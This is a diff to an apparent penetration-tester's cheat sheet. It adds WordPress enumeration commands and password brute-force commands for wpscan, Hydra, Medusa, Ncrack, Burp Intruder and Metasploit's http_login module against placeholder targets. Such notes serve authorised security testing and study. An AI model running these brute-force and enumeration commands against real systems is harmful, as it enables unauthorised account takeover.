@@ -176,7 +176,8 @@ for i in $(cat 80.txt); do cadaver -t $i; done
 
 # WordPress
 
-wpscan -u www.target.com -e u vp vt -r
+wpscan --url http://target --enumerate p --enumerate t --enumerate u
+wpscan --url http://target -U users.txt -P dict.txt
 
 cd /usr/share/wpscan/
 stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
@@ -249,21 +250,35 @@ sort by Status
 	500 	Server message
 	405 	Method not allowed
 
-User-Agent Switcher
+- User-Agent Switcher
 Intruder > clear > select user agent string > Add
 Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
 Sort by Length > Response > Render
 
-Automated Discovery
+- Automated Discovery
 Target > Site map > select root folder > Actively scan this host > ??? > sort by URL
 Manually remove duplicates
 
-Test for account lockout
+- Test for account lockout
 Payload: Null payload : Generate 100 payloads.
 
-Brute force login
-Cluster bomb - multiple usernames/passwords using all combinations.
+- Brute force ia Basic authentication login
+Burp    Cluster bomb - multiple usernames/passwords using all combinations.
 	username - simple list
 	passwords - runtime file
-Sort by Length
+        Look for a Status of 3xx then sort by Length.
+
+Hydra   hydra -L users.txt -P pass.txt <target IP> http-get
+
+Medusa  medusa -U users.txt -P pass.txt -h <target IP> -M http -f
+
+Ncrack  ncrack -U users.txt -P pass.txt http://<target IP>
+
+Metasploit
+	use auxiliary/scanner/http/http_login
+	set user_file user.txt
+	set pass_file pass.txt
+	set rhosts <target IP>
+	set stop_on_success true
+	exploit
 
